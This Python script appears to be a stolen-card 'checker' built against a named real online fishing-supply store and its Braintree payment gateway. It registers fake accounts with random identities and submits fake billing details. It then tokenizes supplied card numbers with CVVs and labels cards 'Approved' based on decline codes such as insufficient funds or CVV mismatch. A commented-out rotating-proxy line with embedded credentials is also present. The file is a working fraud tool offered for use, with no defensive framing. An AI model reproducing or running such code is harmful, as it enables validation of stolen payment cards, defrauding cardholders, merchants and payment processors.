import requests, re, time, base64
from urllib.parse import quote
import os


def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def bw(cc, mes, ano, cvv) -> dict:
    if len(ano) == 2: ano = '20'+ano
    try:

        client = requests.Session()
        #client.proxies = { "http": "http://hjxejzdi-rotate:c0nh3olfrge5@p.webshare.io:80", "https": "http://hjxejzdi-rotate:c0nh3olfrge5@p.webshare.io:80" }

        user = requests.get("https://random-data-api.com/api/v2/users?size=2&is_xml=true").text
        name = parseX(user, '"first_name":"', '"')
        apell = parseX(user, '"last_name":"', '"')
        email = quote(parseX(user, '"email":"', '"'))

        headers = { 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'https://www.profishingsupply.com/', }
        result  = client.get('https://www.profishingsupply.com/my-account/', headers=headers, verify=False).text
        signonsecurity = parseX(result, 'id="signonsecurity" name="signonsecurity" value="', '"')

        if signonsecurity is None: return {'status': 'An error ocurred ❌', 'result': 'Could not find signonsecurity.'}
        headers = { 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Origin': 'https://www.profishingsupply.com', 'Referer': 'https://www.profishingsupply.com/my-account/', }
        data    = f'action=ajaxregister&username={name}f1235&password={name}19022005&email={email}&security={signonsecurity}&become_vendor=&accept_terms='
        result  = client.post('https://www.profishingsupply.com/wp-admin/admin-ajax.php', data=data, headers=headers)

        if not '"loggedin":true' in result.text: return {'status': 'An error ocurred ❌', 'result': 'Could not added login.'}
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'https://www.profishingsupply.com/my-account/edit-address/', }
        result  = client.get('https://www.profishingsupply.com/my-account/edit-address/billing/', headers=headers).text
        address = parseX(result, 'name="woocommerce-edit-address-nonce" value="', '"')

        if address is None: return {'status': 'An error ocurred ❌', 'result': 'Could not find requests address.'}
        headers = { 'Origin': 'https://www.profishingsupply.com', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'https://www.profishingsupply.com/my-account/edit-address/billing/', }
        data    = f'billing_first_name={name}&billing_last_name={apell}&billing_company=&billing_address_1=2582+{name}+Lane&billing_address_2=&billing_country=US&billing_city=newyork&billing_state=TX&billing_postcode=75039&billing_phone=3125252582&billing_email={email}&save_address=Save+address&woocommerce-edit-address-nonce={address}&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address'
        result  = client.post('https://www.profishingsupply.com/my-account/edit-address/billing/', data=data, headers=headers)

        if not 'Address changed successfully' in result.text: return {'status': 'An error ocurred ❌', 'result': 'Could not added address.'}
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'https://www.profishingsupply.com/my-account/edit-address/', }
        result  = client.get('https://www.profishingsupply.com/my-account/payment-methods/', headers=headers).text
        client_token = parseX(result, '"client_token_nonce":"', '"')

        if client_token is None: return {'status': 'An error ocurred ❌', 'result': 'Could not find requests client_token.'}
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'https://www.profishingsupply.com/my-account/payment-methods/', }
        result  = client.get('https://www.profishingsupply.com/my-account/add-payment-method/', headers=headers).text
        method_nonce = parseX(result, 'name="woocommerce-add-payment-method-nonce" value="', '"')

        if method_nonce is None: return {'status': 'An error ocurred ❌', 'result': 'Could not find requests method_nonce.'}
        headers = { 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Origin': 'https://www.profishingsupply.com', 'Referer': 'https://www.profishingsupply.com/my-account/add-payment-method/', }
        data    = f'action=wc_braintree_credit_card_get_client_token&nonce={client_token}'
        result  = client.post('https://www.profishingsupply.com/wp-admin/admin-ajax.php', data=data, headers=headers)

        if not '"success":true' in result.text: return {'status': 'An error ocurred ❌', 'result': 'Could not find requests payment.'}
        graphl = result.json()['data']
        decode = str(base64.b64decode(graphl))
        bearer = parseX(decode, 'authorizationFingerprint":"', '"')

        if bearer is None: return {'status': 'An error ocurred ❌', 'result': 'Could not find bearer.'}
        headers = { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Authorization': f'Bearer {bearer}', 'Braintree-Version': '2018-05-10', 'Accept': '*/*', 'Origin': 'https://assets.braintreegateway.com', 'Referer': 'https://assets.braintreegateway.com/', }
        data    = {"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"652c1a8f-e72c-47bd-85e1-7f7b67eeebf8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":cc ,"expirationMonth":mes ,"expirationYear":ano ,"cvv":cvv},"options":{"validate":False}}},"operationName":"TokenizeCreditCard"}
        result  = requests.post('https://payments.braintree-api.com/graphql', json=data, headers=headers).text
        token   = parseX(result, '"token":"', '"')

        if token is None: return {'status': 'An error ocurred ❌', 'result': 'Could not find token.'}
        
        if cc[0:1] == '4': typo = 'visa'
        elif cc[0:1] == '5': typo = 'master-card'
        elif cc[0:1] == '6': typo = 'discover'
        else: typo = 'american-express'

        headers = { 'Origin': 'https://www.profishingsupply.com', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'https://www.profishingsupply.com/my-account/add-payment-method/', }
        data    = f'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type={typo}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%2283b594f38f1d112972385e09fe90f162%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={method_nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
        result  = client.post('https://www.profishingsupply.com/my-account/add-payment-method/', data=data, headers=headers).text
        os.system('cls')

        if 'Nice! New payment method added' in result:
            client.close()
            return {'status': 'Approved! ✅', 'result': 'Approved'}
        
        elif 'avs_and_cvv' in result:
            client.close()
            message = parseX(result, 'Status code ', '		</li>')
            return {'status': 'Approved! ✅', 'result': message}

        elif 'avs' in result:
            client.close()
            message = parseX(result, 'Status code ', '		</li>')
            return {'status': 'Approved! ✅', 'result': message}
        
        elif 'Insufficient Funds' in result:
            client.close()
            message = parseX(result, 'Status code ', '		</li>')
            return {'status': 'Approved! ✅', 'result': message}
        
        elif 'Card Issuer Declined CVV' in result:
            client.close()
            message = parseX(result, 'Status code ', '		</li>')
            return {'status': 'Approved! ✅', 'result': message}
        
        else:
            client.close()
            message = parseX(result, 'Status code ', '		</li>')
            return {'status': 'Declined ❌', 'result': message}
        
    except Exception as e:
        return {'status':'An ocurred error ⚠️', 'result': e}